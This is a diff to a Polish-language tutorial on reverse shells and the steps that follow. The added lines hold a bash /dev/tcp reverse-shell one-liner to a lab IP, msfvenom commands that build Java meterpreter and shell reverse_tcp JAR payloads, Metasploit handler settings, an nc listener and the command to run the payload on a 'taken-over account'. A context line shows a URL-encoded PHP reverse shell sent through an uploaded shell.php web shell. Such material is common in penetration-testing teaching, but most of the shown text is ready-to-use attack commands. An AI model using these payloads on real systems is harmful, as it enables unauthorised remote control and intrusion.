@@ -267,7 +267,7 @@ Polecam ten drugi sposób z uruchomieniem programu **Script**
 ```bash
 [root@rocky8-test1 ~]# ^[[D^[[D^[[D^[[D
 ```
-Po wejściu na konsolę, podczas ruszania strzałkami są krzaki. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Wciskamy **ctrl+z**
+Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Jednak od razu wspomnę, że nie za dobrze to działa, kiedy **puszczamy Shella** przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_. Jednak z **Nc** działa prawie, że idealnie. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
 {: .text-justify}
 ```bash
 [root@rocky8-test1 ~]# ^Z      
@@ -354,6 +354,36 @@ http://172.16.1.123/uploads/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2
 ```
 Jezeli wszystko przebiegło poprawnie powinniśmy mieć dostęp do **Shella**.
 {: .text-justify}
+# Payloady
+Reverse Shell możemy tworzyć ręcznie, ale bardzo dobrze się nadaje do tego celu polecenie _msvenom_ ze wspomnianego wcześniej **Metasploita**. Tym razem będzie przykład reverse Shell uruchomionego przez Javę. Stworzyć ładunek można poleceniem:
+{: .text-justify}
+## Metasploit
+### Tworzenie ładunku
+```bash
+msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LPORT=1337 LHOST=172.16.1.89 -o shell.jar
+```
+### Ustawienia na Metasploicie
+```bash
+use exploit/multi/handler
+set payload payload/java/shell/reverse_tcp
+set lport 1337
+```
+## Nc
+### Tworzenie ładunku
+```bash
+msfvenom -p java/shell_reverse_tcp LPORT=1337 -f jar -o shell.jar
+```
+### Nasłuchiwanie
+```bash
+nc -lvn -p 1337
+```
+Odpalamy ładunek na przejętym koncie poleceniem, Tu już nie jest ważny **listener**:
+{: .text-justify}
+```bash
+/usr/bin/java -jar shell.jar
+```
+Trochę jest zmylający parametr **LHOST**, bo to nie jest do końca _localhost_, ale w tym przypadku adres gdzie łączy się nasz ładunek.
+{: .text-justify}
 # Koniec
-I to już koniec. Mam nadzieję, że wyjaśniłem trochę sprawę. Na koniec Bonus w postaci [linka](https://www.revshells.com/) do generatora **Shelli**. Jeżeli masz coś ciekawego do dodania, lub znalazłeś poważny błąd, daj znać.
+I to już koniec. Mam nadzieję, że wyjaśniłem trochę sprawę. Na koniec bonus w postaci [linka](https://www.revshells.com/) do generatora **Shelli**. Jeżeli masz coś ciekawego do dodania, lub znalazłeś poważny błąd, daj znać.
 {: .text-justify}
